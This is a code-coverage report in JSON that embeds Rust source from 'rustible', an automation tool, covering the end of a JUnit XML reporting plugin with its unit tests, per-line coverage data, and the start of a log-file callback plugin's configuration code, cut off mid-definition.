mut suites = self.test_suites.write().await;\n        if let Some(suite) = suites.get_mut(suite_idx) {\n            suite.test_cases.push(test_case);\n        }\n\n        // Mark playbook as failed\n        let mut playbook_success = self.playbook_success.write().await;\n        *playbook_success = false;\n    }\n}\n\n/// Escapes special XML characters in attribute values.\nfn escape_xml(s: \u0026str) -\u003e String {\n    s.replace('\u0026', \"\u0026amp;\")\n        .replace('\u003c', \"\u0026lt;\")\n        .replace('\u003e', \"\u0026gt;\")\n        .replace('\"', \"\u0026quot;\")\n        .replace('\\'', \"\u0026apos;\")\n}\n\n/// Escapes special XML characters in element content.\nfn escape_xml_content(s: \u0026str) -\u003e String {\n    s.replace('\u0026', \"\u0026amp;\")\n        .replace('\u003c', \"\u0026lt;\")\n        .replace('\u003e', \"\u0026gt;\")\n}\n\n/// Truncates a message to a maximum length, adding ellipsis if needed.\nfn truncate_message(message: \u0026str, max_len: usize) -\u003e String {\n    if message.len() \u003c= max_len {\n        message.to_string()\n    } else {\n        format!(\"{}...\", \u0026message[..max_len.saturating_sub(3)])\n    }\n}\n\n#[cfg(test)]\nmod tests {\n    use super::*;\n    use crate::traits::ModuleResult;\n    use std::time::Duration;\n\n    fn create_execution_result(\n        host: \u0026str,\n        task_name: \u0026str,\n        success: bool,\n        changed: bool,\n        skipped: bool,\n        message: \u0026str,\n    ) -\u003e ExecutionResult {\n        ExecutionResult {\n            host: host.to_string(),\n            task_name: task_name.to_string(),\n            result: ModuleResult {\n                success,\n                changed,\n                message: message.to_string(),\n                skipped,\n                data: None,\n                warnings: Vec::new(),\n            },\n            duration: Duration::from_millis(100),\n            notify: Vec::new(),\n        }\n    }\n\n    #[tokio::test]\n    async fn test_junit_callback_basic() {\n        let callback = JUnitCallback::new(\"/tmp/test-junit.xml\");\n\n        callback.on_playbook_start(\"test-playbook\").await;\n        callback\n            .on_play_start(\"test-play\", \u0026[\"host1\".to_string()])\n            .await;\n\n        let ok_result = create_execution_result(\"host1\", \"task1\", true, false, false, \"ok\");\n        callback.on_task_complete(\u0026ok_result).await;\n\n        let failed_result =\n            create_execution_result(\"host1\", \"task2\", false, false, false, \"error occurred\");\n        callback.on_task_complete(\u0026failed_result).await;\n\n        callback.on_play_end(\"test-play\", false).await;\n        callback.on_playbook_end(\"test-playbook\", false).await;\n\n        // Verify XML generation\n        let xml = callback.generate_xml().await;\n        assert!(xml.contains(\"\u003c?xml version=\\\"1.0\\\" encoding=\\\"UTF-8\\\"?\u003e\"));\n        assert!(xml.contains(\"\u003ctestsuites\"));\n        assert!(xml.contains(\"tests=\\\"2\\\"\"));\n        assert!(xml.contains(\"failures=\\\"1\\\"\"));\n        assert!(xml.contains(\"\u003ctestsuite name=\\\"test-play\\\"\"));\n        assert!(xml.contains(\"\u003ctestcase name=\\\"task1\\\"\"));\n        assert!(xml.contains(\"\u003ctestcase name=\\\"task2\\\"\"));\n        assert!(xml.contains(\"\u003cfailure\"));\n    }\n\n    #[tokio::test]\n    async fn test_junit_callback_skipped() {\n        let callback = JUnitCallback::new(\"/tmp/test-junit-skip.xml\");\n\n        callback.on_playbook_start(\"test-playbook\").await;\n        callback\n            .on_play_start(\"test-play\", \u0026[\"host1\".to_string()])\n            .await;\n\n        let skipped_result =\n            create_execution_result(\"host1\", \"task1\", true, false, true, \"condition not met\");\n        callback.on_task_complete(\u0026skipped_result).await;\n\n        callback.on_play_end(\"test-play\", true).await;\n        callback.on_playbook_end(\"test-playbook\", true).await;\n\n        let xml = callback.generate_xml().await;\n        assert!(xml.contains(\"skipped=\\\"1\\\"\"));\n        assert!(xml.contains(\"\u003cskipped message=\\\"condition not met\\\"\"));\n    }\n\n    #[tokio::test]\n    async fn test_junit_callback_multiple_hosts() {\n        let callback = JUnitCallback::new(\"/tmp/test-junit-multi.xml\");\n\n        callback.on_playbook_start(\"test-playbook\").await;\n        callback\n            .on_play_start(\"test-play\", \u0026[\"host1\".to_string(), \"host2\".to_string()])\n            .await;\n\n        let ok1 = create_execution_result(\"host1\", \"task1\", true, true, false, \"changed\");\n        let ok2 = create_execution_result(\"host2\", \"task1\", true, false, false, \"ok\");\n\n        callback.on_task_complete(\u0026ok1).await;\n        callback.on_task_complete(\u0026ok2).await;\n\n        callback.on_play_end(\"test-play\", true).await;\n        callback.on_playbook_end(\"test-playbook\", true).await;\n\n        let xml = callback.generate_xml().await;\n        assert!(xml.contains(\"tests=\\\"2\\\"\"));\n        assert!(xml.contains(\"classname=\\\"host1\\\"\"));\n        assert!(xml.contains(\"classname=\\\"host2\\\"\"));\n    }\n\n    #[tokio::test]\n    async fn test_junit_callback_unreachable() {\n        let callback = JUnitCallback::new(\"/tmp/test-junit-unreachable.xml\");\n\n        callback.on_playbook_start(\"test-playbook\").await;\n        callback\n            .on_play_start(\"test-play\", \u0026[\"host1\".to_string()])\n            .await;\n\n        callback\n            .on_host_unreachable(\"host1\", \"gather_facts\", \"Connection refused\")\n            .await;\n\n        callback.on_play_end(\"test-play\", false).await;\n        callback.on_playbook_end(\"test-playbook\", false).await;\n\n        let xml = callback.generate_xml().await;\n        assert!(xml.contains(\"errors=\\\"1\\\"\"));\n        assert!(xml.contains(\"\u003cerror message=\\\"Host unreachable: host1\\\"\"));\n    }\n\n    #[tokio::test]\n    async fn test_junit_callback_has_failures() {\n        let callback = JUnitCallback::new(\"/tmp/test-junit-failures.xml\");\n\n        callback.on_playbook_start(\"test-playbook\").await;\n        callback\n            .on_play_start(\"test-play\", \u0026[\"host1\".to_string()])\n            .await;\n\n        // Initially no failures\n        assert!(!callback.has_failures().await);\n\n        let failed_result = create_execution_result(\"host1\", \"task1\", false, false, false, \"error\");\n        callback.on_task_complete(\u0026failed_result).await;\n\n        // Now has failures\n        assert!(callback.has_failures().await);\n    }\n\n    #[test]\n    fn test_escape_xml() {\n        assert_eq!(escape_xml(\"hello\"), \"hello\");\n        assert_eq!(escape_xml(\"\u003ctest\u003e\"), \"\u0026lt;test\u0026gt;\");\n        assert_eq!(escape_xml(\"a \u0026 b\"), \"a \u0026amp; b\");\n        assert_eq!(escape_xml(\"\\\"quoted\\\"\"), \"\u0026quot;quoted\u0026quot;\");\n        assert_eq!(escape_xml(\"it's\"), \"it\u0026apos;s\");\n    }\n\n    #[test]\n    fn test_truncate_message() {\n        assert_eq!(truncate_message(\"short\", 100), \"short\");\n        assert_eq!(truncate_message(\"hello world\", 8), \"hello...\");\n        assert_eq!(truncate_message(\"abc\", 3), \"abc\");\n    }\n\n    #[test]\n    fn test_suite_stats() {\n        let mut suite = TestSuite::new(\"test\".to_string());\n\n        suite.test_cases.push(TestCase {\n            name: \"t1\".to_string(),\n            classname: \"host\".to_string(),\n            time: 1.0,\n            outcome: TestOutcome::Passed,\n        });\n\n        suite.test_cases.push(TestCase {\n            name: \"t2\".to_string(),\n            classname: \"host\".to_string(),\n            time: 2.0,\n            outcome: TestOutcome::Failure {\n                message: \"failed\".to_string(),\n                details: \"details\".to_string(),\n            },\n        });\n\n        suite.test_cases.push(TestCase {\n            name: \"t3\".to_string(),\n            classname: \"host\".to_string(),\n            time: 0.5,\n            outcome: TestOutcome::Skipped {\n                message: \"skipped\".to_string(),\n            },\n        });\n\n        let stats = suite.stats();\n        assert_eq!(stats.tests, 3);\n        assert_eq!(stats.passed, 1);\n        assert_eq!(stats.failures, 1);\n        assert_eq!(stats.skipped, 1);\n        assert_eq!(stats.errors, 0);\n        assert!((stats.time - 3.5).abs() \u003c 0.001);\n    }\n\n    #[test]\n    fn test_clone_shares_state() {\n        let callback1 = JUnitCallback::new(\"/tmp/test.xml\");\n        let callback2 = callback1.clone();\n\n        assert!(Arc::ptr_eq(\u0026callback1.test_suites, \u0026callback2.test_suites));\n        assert!(Arc::ptr_eq(\n            \u0026callback1.playbook_name,\n            \u0026callback2.playbook_name\n        ));\n    }\n\n    #[test]\n    fn test_output_path() {\n        let callback = JUnitCallback::new(\"/path/to/output.xml\");\n        assert_eq!(callback.output_path(), Path::new(\"/path/to/output.xml\"));\n    }\n\n    #[test]\n    fn test_with_default_path() {\n        let callback = JUnitCallback::with_default_path();\n        assert_eq!(callback.output_path(), Path::new(\"junit.xml\"));\n    }\n\n    #[test]\n    fn test_default_trait() {\n        let callback = JUnitCallback::default();\n        assert_eq!(callback.output_path(), Path::new(\"junit.xml\"));\n    }\n}\n","traces":[{"line":103,"address":[28627338,28627120],"length":1,"stats":{"Line":1}},{"line":106,"address":[28627156],"length":1,"stats":{"Line":1}},{"line":107,"address":[28627198],"length":1,"stats":{"Line":1}},{"line":113,"address":[28627360],"length":1,"stats":{"Line":1}},{"line":114,"address":[28627390],"length":1,"stats":{"Line":1}},{"line":115,"address":[28627405],"length":1,"stats":{"Line":1}},{"line":117,"address":[28627424,28627729],"length":1,"stats":{"Line":2}},{"line":118,"address":[28627522],"length":1,"stats":{"Line":1}},{"line":119,"address":[28627586,28627687],"length":1,"stats":{"Line":2}},{"line":120,"address":[28627610,28627739],"length":1,"stats":{"Line":2}},{"line":121,"address":[28627634,28627764],"length":1,"stats":{"Line":2}},{"line":122,"address":[28627789,28627658],"length":1,"stats":{"Line":2}},{"line":124,"address":[28627712],"length":1,"stats":{"Line":1}},{"line":127,"address":[28627556],"length":1,"stats":{"Line":1}},{"line":131,"address":[28627824],"length":1,"stats":{"Line":1}},{"line":132,"address":[28627838],"length":1,"stats":{"Line":1}},{"line":133,"address":[28627901],"length":1,"stats":{"Line":1}},{"line":199,"address":[30269269,30269216,30270097],"length":1,"stats":{"Line":1}},{"line":201,"address":[30269243,30269314],"length":1,"stats":{"Line":2}},{"line":202,"address":[30269338,30269383],"length":1,"stats":{"Line":2}},{"line":203,"address":[30269542,30269456],"length":1,"stats":{"Line":2}},{"line":204,"address":[30269639,30269567],"length":1,"stats":{"Line":2}},{"line":205,"address":[30269736,30269664],"length":1,"stats":{"Line":2}},{"line":206,"address":[30269857,30269771],"length":1,"stats":{"Line":2}},{"line":207,"address":[30269934,30269890],"length":1,"stats":{"Line":2}},{"line":215,"address":[28622080],"length":1,"stats":{"Line":1}},{"line":216,"address":[28622088],"length":1,"stats":{"Line":1}},{"line":220,"address":[28622032],"length":1,"stats":{"Line":1}},{"line":221,"address":[28622037],"length":1,"stats":{"Line":1}},{"line":225,"address":[28622064,28622072],"length":1,"stats":{"Line":4}},{"line":226,"address":[25984980],"length":1,"stats":{"Line":3}},{"line":237,"address":[28626464,28626472],"length":1,"stats":{"Line":6}},{"line":238,"address":[25975361],"length":1,"stats":{"Line":2}},{"line":241,"address":[30270790,30270699],"length":1,"stats":{"Line":2}},{"line":242,"address":[30270916,30271440,30271005],"length":1,"stats":{"Line":3}},{"line":243,"address":[25975377],"length":1,"stats":{"Line":2}},{"line":247,"address":[30270941,30270290,30271461,30271633],"length":1,"stats":{"Line":3}},{"line":251,"address":[30263817,30263646,30263582,30263503,30263675,30263625,30263456,30264275],"length":1,"stats":{"Line":4}},{"line":252,"address":[25984703],"length":1,"stats":{"Line":2}},{"line":253,"address":[25984718],"length":1,"stats":{"Line":2}},{"line":254,"address":[25984733],"length":1,"stats":{"Line":2}},{"line":256,"address":[30265050,30264983],"length":1,"stats":{"Line":2}},{"line":257,"address":[30265321,30265194],"length":1,"stats":{"Line":2}},{"line":259,"address":[30267225,30265244,30267216],"length":1,"stats":{"Line":3}},{"line":263,"address":[30265330],"length":1,"stats":{"Line":1}},{"line":264,"address":[30265342],"length":1,"stats":{"Line":1}},{"line":265,"address":[30265354],"length":1,"stats":{"Line":1}},{"line":266,"address":[30265366],"length":1,"stats":{"Line":1}},{"line":268,"address":[30265378,30267183],"length":1,"stats":{"Line":2}},{"line":269,"address":[30265632],"length":1,"stats":{"Line":1}},{"line":270,"address":[30267017,30266938],"length":1,"stats":{"Line":1}},{"line":271,"address":[30266983,30267042,30267084],"length":1,"stats":{"Line":2}},{"line":272,"address":[30267107,30267149,30267050],"length":1,"stats":{"Line":2}},{"line":273,"address":[30267115,30267175,30267188],"length":1,"stats":{"Line":2}},{"line":276,"address":[30265650],"length":1,"stats":{"Line":1}},{"line":277,"address":[30265657],"length":1,"stats":{"Line":1}},{"line":278,"address":[30266377,30265767],"length":1,"stats":{"Line":2}},{"line":280,"address":[30265752],"length":1,"stats":{"Line":1}},{"line":288,"address":[30266411],"length":1,"stats":{"Line":1}},{"line":289,"address":[30266830,30266617],"length":1,"stats":{"Line":2}},{"line":292,"address":[30266639],"length":1,"stats":{"Line":1}},{"line":293,"address":[30266666],"length":1,"stats":{"Line":1}},{"line":297,"address":[28625296,28626445,28626451],"length":1,"stats":{"Line":1}},{"line":298,"address":[28625352],"length":1,"stats":{"Line":1}},{"line":299,"address":[28625365],"length":1,"stats":{"Line":1}},{"line":301,"address":[28625466,28626071],"length":1,"stats":{"Line":2}},{"line":303,"address":[28625375,28625454],"length":1,"stats":{"Line":2}},{"line":311,"address":[28626102],"length":1,"stats":{"Line":1}},{"line":312,"address":[28626337,28626242],"length":1,"stats":{"Line":2}},{"line":315,"address":[28626249],"length":1,"stats":{"Line":1}},{"line":316,"address":[28626286],"length":1,"stats":{"Line":1}},{"line":320,"address":[28625283,28622160,28623709],"length":1,"stats":{"Line":1}},{"line":321,"address":[28622215],"length":1,"stats":{"Line":1}},{"line":323,"address":[28622448,28622365,28622910],"length":1,"stats":{"Line":2}},{"line":325,"address":[28622228,28622323],"length":1,"stats":{"Line":2}},{"line":326,"address":[28622338,28622433],"length":1,"stats":{"Line":2}},{"line":330,"address":[28622944],"length":1,"stats":{"Line":1}},{"line":332,"address":[28622981,28623231],"length":1,"stats":{"Line":2}},{"line":334,"address":[28623019],"length":1,"stats":{"Line":1}},{"line":335,"address":[28623039],"length":1,"stats":{"Line":1}},{"line":336,"address":[28623362,28623651],"length":1,"stats":{"Line":2}},{"line":338,"address":[28623300],"length":1,"stats":{"Line":1}},{"line":340,"address":[28623677],"length":1,"stats":{"Line":1}},{"line":342,"address":[28623077],"length":1,"stats":{"Line":1}},{"line":343,"address":[28623120],"length":1,"stats":{"Line":1}},{"line":344,"address":[28623779,28624056],"length":1,"stats":{"Line":2}},{"line":346,"address":[28623723],"length":1,"stats":{"Line":1}},{"line":348,"address":[28624090],"length":1,"stats":{"Line":1}},{"line":349,"address":[28624443],"length":1,"stats":{"Line":1}},{"line":350,"address":[28624470],"length":1,"stats":{"Line":1}},{"line":352,"address":[28623158],"length":1,"stats":{"Line":1}},{"line":353,"address":[28623201],"length":1,"stats":{"Line":1}},{"line":354,"address":[28624837,28624560],"length":1,"stats":{"Line":2}},{"line":356,"address":[28624510],"length":1,"stats":{"Line":1}},{"line":358,"address":[28624871],"length":1,"stats":{"Line":1}},{"line":359,"address":[28625224],"length":1,"stats":{"Line":1}},{"line":360,"address":[28625251],"length":1,"stats":{"Line":1}},{"line":364,"address":[28623249],"length":1,"stats":{"Line":1}},{"line":368,"address":[28622112,28622130],"length":1,"stats":{"Line":4}},{"line":369,"address":[26016695],"length":1,"stats":{"Line":2}},{"line":372,"address":[30268419,30269042,30269193,30268644,30268476,30269168],"length":1,"stats":{"Line":6}},{"line":373,"address":[30268636],"length":1,"stats":{"Line":1}},{"line":375,"address":[30268747,30268651],"length":1,"stats":{"Line":2}},{"line":376,"address":[30268825,30268770],"length":1,"stats":{"Line":2}},{"line":377,"address":[30268988,30268936,30269047],"length":1,"stats":{"Line":2}},{"line":383,"address":[28627952],"length":1,"stats":{"Line":1}},{"line":384,"address":[28627960],"length":1,"stats":{"Line":1}},{"line":389,"address":[28621247,28620704,28621253],"length":1,"stats":{"Line":1}},{"line":391,"address":[28620739],"length":1,"stats":{"Line":1}},{"line":392,"address":[28620816,28620749],"length":1,"stats":{"Line":2}},{"line":393,"address":[28620881,28620821],"length":1,"stats":{"Line":2}},{"line":394,"address":[28620886,28620946],"length":1,"stats":{"Line":2}},{"line":395,"address":[28621011,28620951],"length":1,"stats":{"Line":2}},{"line":396,"address":[28621019,28621082],"length":1,"stats":{"Line":2}},{"line":397,"address":[28621090],"length":1,"stats":{"Line":1}},{"line":405,"address":[28609727],"length":1,"stats":{"Line":4}},{"line":406,"address":[26125202],"length":1,"stats":{"Line":2}},{"line":407,"address":[30255341,30255239,30255212,30255698,30255409],"length":1,"stats":{"Line":1}},{"line":409,"address":[30255608,30255744,30255531,30254716],"length":1,"stats":{"Line":2}},{"line":410,"address":[30256050,30255960],"length":1,"stats":{"Line":2}},{"line":412,"address":[26125238],"length":1,"stats":{"Line":1}},{"line":413,"address":[30256522,30256449],"length":1,"stats":{"Line":2}},{"line":416,"address":[26125259],"length":1,"stats":{"Line":1}},{"line":417,"address":[30256945,30256880],"length":1,"stats":{"Line":2}},{"line":419,"address":[30256960,30257091,30254779],"length":1,"stats":{"Line":1}},{"line":420,"address":[30257323,30257378],"length":1,"stats":{"Line":2}},{"line":424,"address":[30247516,30247292,30247356,30249175,30248061,30247199,30247335,30247168,30248757],"length":1,"stats":{"Line":5}},{"line":425,"address":[30247322,30247550,30247432,30247270],"length":1,"stats":{"Line":2}},{"line":426,"address":[30247769,30247854],"length":1,"stats":{"Line":2}},{"line":427,"address":[30247859],"length":1,"stats":{"Line":1}},{"line":430,"address":[26120609],"length":1,"stats":{"Line":2}},{"line":431,"address":[30248360,30248298],"length":1,"stats":{"Line":2}},{"line":432,"address":[30248537,30248774],"length":1,"stats":{"Line":2}},{"line":434,"address":[30248555],"length":1,"stats":{"Line":1}},{"line":437,"address":[26120625],"length":1,"stats":{"Line":4}},{"line":438,"address":[30249109,30249248],"length":1,"stats":{"Line":0}},{"line":446,"address":[28609311],"length":1,"stats":{"Line":4}},{"line":447,"address":[30245330,30245148,30245227,30245101],"length":1,"stats":{"Line":2}},{"line":448,"address":[30245554,30245712,30245967,30245527,30245650],"length":1,"stats":{"Line":1}},{"line":451,"address":[30245912,30245828,30246007,30245160],"length":1,"stats":{"Line":2}},{"line":455,"address":[28609194],"length":1,"stats":{"Line":4}},{"line":456,"address":[26112212],"length":1,"stats":{"Line":2}},{"line":457,"address":[30244701,30244976,30244993,30244755],"length":1,"stats":{"Line":4}},{"line":458,"address":[30244912,30244931],"length":1,"stats":{"Line":2}},{"line":463,"address":[30246363,30246249,30246490,30247100,30246224,30246324,30247148],"length":1,"stats":{"Line":0}},{"line":464,"address":[30246351,30246521,30246308,30246418],"length":1,"stats":{"Line":0}},{"line":465,"address":[30247126,30246777,30246723,30246804,30247001],"length":1,"stats":{"Line":0}},{"line":469,"address":[28609575],"length":1,"stats":{"Line":4}},{"line":470,"address":[30249918,30249562,30249621,30249791],"length":1,"stats":{"Line":2}},{"line":471,"address":[30250352,30250175],"length":1,"stats":{"Line":2}},{"line":475,"address":[30250378],"length":1,"stats":{"Line":1}},{"line":478,"address":[30250646,30250458,30249642,30250539],"length":1,"stats":{"Line":2}},{"line":479,"address":[30251299,30251360,30250904],"length":1,"stats":{"Line":3}},{"line":480,"address":[30250979],"length":1,"stats":{"Line":1}},{"line":481,"address":[30254432,30251234,30254441],"length":1,"stats":{"Line":1}},{"line":482,"address":[30251182,30251311,30251279,30251366],"length":1,"stats":{"Line":3}},{"line":483,"address":[30251393],"length":1,"stats":{"Line":1}},{"line":486,"address":[30252207,30251423],"length":1,"stats":{"Line":2}},{"line":488,"address":[30251473],"length":1,"stats":{"Line":1}},{"line":490,"address":[30251447,30251575],"length":1,"stats":{"Line":2}},{"line":492,"address":[30251514,30251651],"length":1,"stats":{"Line":2}},{"line":493,"address":[30251666,30251782],"length":1,"stats":{"Line":2}},{"line":499,"address":[30251556],"length":1,"stats":{"Line":1}},{"line":504,"address":[30252099],"length":1,"stats":{"Line":1}},{"line":505,"address":[30252272],"length":1,"stats":{"Line":1}},{"line":506,"address":[30252347],"length":1,"stats":{"Line":1}},{"line":511,"address":[30252714,30252607,30249663,30252812],"length":1,"stats":{"Line":2}},{"line":512,"address":[26122862],"length":1,"stats":{"Line":1}},{"line":513,"address":[30253449,30253378],"length":1,"stats":{"Line":2}},{"line":514,"address":[30253575,30253717],"length":1,"stats":{"Line":2}},{"line":518,"address":[30253727,30253699],"length":1,"stats":{"Line":2}},{"line":519,"address":[26122883],"length":1,"stats":{"Line":1}},{"line":520,"address":[30254197,30254142],"length":1,"stats":{"Line":2}},{"line":525,"address":[28609795],"length":1,"stats":{"Line":0}},{"line":530,"address":[28609656],"length":1,"stats":{"Line":0}},{"line":544,"address":[28614295],"length":1,"stats":{"Line":4}},{"line":545,"address":[30257916,30257708,30257767,30258043],"length":1,"stats":{"Line":2}},{"line":546,"address":[30258300,30258477],"length":1,"stats":{"Line":2}},{"line":550,"address":[30258503],"length":1,"stats":{"Line":1}},{"line":554,"address":[30258583],"length":1,"stats":{"Line":1}},{"line":555,"address":[30258663],"length":1,"stats":{"Line":1}},{"line":557,"address":[30259240],"length":1,"stats":{"Line":1}},{"line":567,"address":[26147636],"length":1,"stats":{"Line":2}},{"line":568,"address":[26147654],"length":1,"stats":{"Line":1}},{"line":569,"address":[30260275,30260204],"length":1,"stats":{"Line":2}},{"line":570,"address":[30260542,30260401],"length":1,"stats":{"Line":2}},{"line":574,"address":[26147675],"length":1,"stats":{"Line":2}},{"line":575,"address":[30260887,30260944],"length":1,"stats":{"Line":2}},{"line":580,"address":[28621424,28622013,28622007],"length":1,"stats":{"Line":1}},{"line":581,"address":[28621457,28621618,28621728,28621832],"length":1,"stats":{"Line":4}},{"line":589,"address":[28626784,28627091,28627097],"length":1,"stats":{"Line":1}},{"line":590,"address":[28626811,28626957],"length":1,"stats":{"Line":2}},{"line":596,"address":[28626480],"length":1,"stats":{"Line":1}},{"line":597,"address":[28626552],"length":1,"stats":{"Line":1}},{"line":598,"address":[28626763],"length":1,"stats":{"Line":1}},{"line":600,"address":[28626576],"length":1,"stats":{"Line":1}}],"covered":190,"coverable":196},{"path":["/","home","artur","Repositories","rustible","src","callback","plugins","logfile.rs"],"content":"//! Log File Callback Plugin for Rustible\n//!\n//! This plugin logs playbook execution to files with comprehensive features:\n//!\n//! - Separate log file per playbook run (timestamped filenames)\n//! - Configurable log directory\n//! - Log rotation support (by count and/or age)\n//! - Both human-readable and machine-parseable (JSON) formats\n//! - ISO 8601 timestamps on all log entries\n//!\n//! # Features\n//!\n//! - **Per-run logs**: Each playbook run creates a unique log file\n//! - **Dual format**: Human-readable text with optional JSON sidecar\n//! - **Rotation**: Automatic cleanup of old log files\n//! - **Configurable**: Directory, retention, and format options\n//! - **Thread-safe**: Safe for concurrent access\n//!\n//! # Example Output (Human-readable)\n//!\n//! ```text\n//! [2024-01-15T10:30:45.123Z] PLAYBOOK START: deploy.yml\n//! [2024-01-15T10:30:45.125Z] PLAY START: Deploy application | hosts: webservers\n//! [2024-01-15T10:30:45.130Z] TASK START: Install nginx | host: web01\n//! [2024-01-15T10:30:46.234Z] TASK RESULT: web01 | Install nginx | CHANGED (1.104s)\n//! [2024-01-15T10:30:46.890Z] TASK RESULT: web02 | Install nginx | OK (0.656s)\n//! [2024-01-15T10:31:00.000Z] PLAYBOOK END: deploy.yml | Duration: 14.877s\n//! ```\n//!\n//! # Example Output (JSON, one entry per line)\n//!\n//! ```json\n//! {\"timestamp\":\"2024-01-15T10:30:45.123Z\",\"event\":\"playbook_start\",\"playbook\":\"deploy.yml\"}\n//! {\"timestamp\":\"2024-01-15T10:30:45.125Z\",\"event\":\"play_start\",\"name\":\"Deploy application\",\"hosts\":\"web01, web02\"}\n//! ```\n//!\n//! # Usage\n//!\n//! ```rust,ignore\n//! use rustible::callback::plugins::logfile::{LogFileCallback, LogFileConfig};\n//! use std::path::PathBuf;\n//!\n//! // Create with default configuration (logs to ./logs)\n//! let callback = LogFileCallback::new(LogFileConfig::default())?;\n//!\n//! // Or with custom configuration\n//! let config = LogFileConfig::builder()\n//!     .log_directory(\"/var/log/rustible\")\n//!     .json_format(true)\n//!     .max_log_files(30)\n//!     .build();\n//! let callback = LogFileCallback::new(config)?;\n//!\n//! executor.with_callback(Box::new(callback));\n//! ```\n\nuse std::collections::HashMap;\nuse std::fs::{self, File, OpenOptions};\nuse std::io::{BufWriter, Write};\nuse std::path::PathBuf;\nuse std::time::{Duration, Instant};\n\nuse async_trait::async_trait;\nuse chrono::Utc;\nuse parking_lot::RwLock;\nuse serde::{Deserialize, Serialize};\n\nuse crate::facts::Facts;\nuse crate::traits::{ExecutionCallback, ExecutionResult};\n\n// ============================================================================\n// Configuration\n// ============================================================================\n\n/// Configuration for the log file callback plugin.\n#[derive(Debug, Clone, Serialize, Deserialize)]\npub struct LogFileConfig {\n    /// Directory where log files are stored.\n    /// Defaults to `./logs` if not specified.\n    pub log_directory: PathBuf,\n\n    /// Whether to also write JSON format logs.\n    /// Creates a `.json` sidecar file alongside the human-readable log.\n    #[serde(default)]\n    pub json_format: bool,\n\n    /// Maximum number of log files to retain.\n    /// Older files are deleted when this limit is exceeded.\n    /// Set to 0 for unlimited retention.\n    #[serde(default = \"default_max_log_files\")]\n    pub max_log_files: usize,\n\n    /// Maximum age of log files in days.\n    /// Files older than this are deleted during rotation.\n    /// Set to 0 for unlimited age.\n    #[serde(default)]\n    pub max_log_age_days: u32,\n\n    /// Prefix for log file names.\n    /// Files are named: `{prefix}_{playbook}_{timestamp}.log`\n    #[serde(default = \"default_log_prefix\")]\n    pub log_prefix: String,\n\n    /// Whether to include task arguments in logs.\n    /// May expose sensitive data - disabled by default.\n    #[serde(default)]\n    pub include_task_args: bool,\n\n    /// Whether to include command stdout/stderr in logs.\n    #[serde(default = \"default_include_output\")]\n    pub include_output: bool,\n\n    /// Whether to include diffs in logs.\n    #[serde(default)]\n    pub include_diffs: bool,\n\n    /// Whether to flush after each write (slower but safer).\n    #[serde(default = \"default_flush_immediately\")]\n    pub flush_immediately: bool,\n\n    /// Whether to append to existing log file or create new one.\n    #[serde(default)]\n    pub append: bool,\n\n    /// Log level filter: \"all\", \"changes\", \"failures\"\n    #[serde(default = \"default_log_level\")]\n    pub log_level: String,\n}\n\nfn default_max_log_files() -\u003e usize {\n    50\n}\n\nfn default_log_prefix() -\u003e String {\n    \"rustible\".to_string()\n}\n\nfn default_include_output() -\u003e bool {\n    true\n}\n\nfn default_flush_immediately() -\u003e bool {\n    true\n}\n\nfn default_log_level() -\u003e String {\n    \"all\".to_string()\n}\n\nimpl Default for LogFileConfig {\n    fn default() -\u003e Self {\n        Self {\n            log_directory: PathBuf::from(\"./logs\"),\n            json_format: false,\n            max_log_files: default_max_log_files(),\n            max_log_age_days: 0,\n            log_prefix: default_log_prefix(),\n            include_task_args: false,\n            include_output: default_include_output(),\n            include_diffs: false,\n            flush_immediately: default_flush_immediately(),\n            append: false,\n            log_level: default_log_level(),\n        }\n    }\n}\n\nimpl LogFileConfig {\n    /// Creates a new configuration builder.\n    #[must_use]\n    pub fn builder() -\u003e LogFileConfigBuilder {\n        LogFileConfigBuilder::default()\n    }\n\n    /// Creates a configuration with the specified log directory.\n    #[must_use]\n    pub fn with_directory(directory: impl Into\u003cPathBuf\u003e) -\u003e Self {\n        Self {\n            log_directory: directory.into(),\n            ..Default::default()\n        }\n    }\n}\n\n/// Builder for `LogFileConfig`.\n#[derive(Debug, Default)]\npub struct LogFileConfigBuilder {\n    config: LogFileConfig,\n}\n\nimpl LogFileConfigBuilder {\n    /// Sets the log directory.\n    #[must_use]\n    pub fn log_directory(mut self, path: impl Into\u003cPathBuf\u003e) -\u003e Self {\n        self.config.log_directory = path.into();\n        self\n    }\n\n    /// Enables or disables JSON format logging.\n    #[must_use]\n    pub fn json_format(mut self, enabled: bool) -\u003e Self {\n        self.config.json_format = enabled;\n        self\n    }\n\n    /// Sets the maximum number of log files to retain.\n    #[must_use]\n    pub fn max_log_files(mut self, count: usize) -\u003e Self {\n        self.config.max_log_files = count;\n        self\n    }\n\n    /// Sets the maximum age of log files in days.\n    #[must_use]\n    pub fn max_log_age_days(mut self, days: u32) -\u003e Self {\n        self.config.max_log_age_days = days;\n        self\n    }\n\n    /// Sets the log file name prefix.\n    #[must_use]\n    pub fn log_prefix(mut self, prefix: impl Into\u003cString\u003e) -\u003e Self {\n        self.config.log_prefix = prefix.into();\n        self\n    }\n\n    /// Enables or disables including task arguments in logs.\n    #[must_use]\n    pub fn include_task_args(mut self, enabled: bool) -\u003e Self {\n        self.config.include_task_args = enabled;\n        self\n    }\n\n    /// Enables or disables including command output in logs.\n    #[must_use]\n    pub fn include_output(mut self, enabled: bool) -\u003e Self {\n        self.config.include_output = enabled;\n        self\n    }\n\n    /// Enables or disables including diffs in logs.\n    #[must_use]\n    pub fn include_diffs(mut self, enabled: bool) -\u003e Self {\n        self.config.include_diffs = enabled;\n        self\n    }\n\n    /// Enables or disables immediate flushing.\n    #[must_use]\n    pub fn flush_immediately(mut self, enabled: bool) -\u003e Self {\n        self.config.flush_immediately = enabled;\n        self\n    }\n\n    /// Enables or disables append mode.\n    #[must_use]\n    pub fn append(mut self, enabled: bool) -\u003e Self {\n        self.config.append = enabled;\n        self\n    }\n\n    /// Sets the log level filter.\n    #[must_use]\n    pub fn log_level(mut self, level: impl Into\u003cString\u003e) -\u003e Self {\n        self.config.log_level = level.into();\n        self\n    }\n\n    /// Builds the configuration.\n    #[must_use]\n    pub fn build(self) -\u003e LogFileConfig {\n        self.config\n    }\n}\n\n// ============================================================================\n// Log Events\n// ============================================================================\n\n/// A log entry event type.\n#[derive(Debug, Clone, Serialize, Deserialize)]\n#[serde(tag = \"event\", rename_all = \"snake_case\")]\npub enum LogEvent {\n    /// Playbook execution started.\n    PlaybookStart { playbook: String },\n    /// Playbook execution ended.\n    PlaybookEnd {\n        playbook: String,\n        duration_secs: f64,\n        success: bool,\n        stats: HashMap\u003cString, HostLogStats\u003e,\n    },\n    /// Play execution started.\n    PlayStart { name: String, hosts: String },\n    /// Play execution ended.\n    PlayEnd { name: String, 